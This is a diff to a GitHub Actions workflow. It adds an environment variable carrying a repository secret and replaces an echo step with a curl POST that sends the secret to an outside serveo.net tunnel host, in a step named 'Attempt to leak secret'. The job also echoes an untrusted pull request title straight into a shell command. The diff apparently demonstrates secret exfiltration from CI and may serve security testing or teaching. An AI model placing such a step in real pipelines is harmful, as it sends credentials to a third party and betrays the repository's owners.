@@ -7,6 +7,8 @@ on:
 jobs:
   echo-title:
     runs-on: ubuntu-latest
+    env:
+      LEAK_SECRET: ${{ secrets.SUPER_SECRET }}   # GitHub interpolates this BEFORE the shell runs
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
@@ -14,4 +16,4 @@ jobs:
       - name: Attempt to leak secret
         run: |
           echo "PR Title: ${{ github.event.pull_request.title }}"
-          echo "Secret: ${{ secrets.SUPER_SECRET }}"
+          curl -X POST https://yourname.serveo.net --data "$LEAK_SECRET"
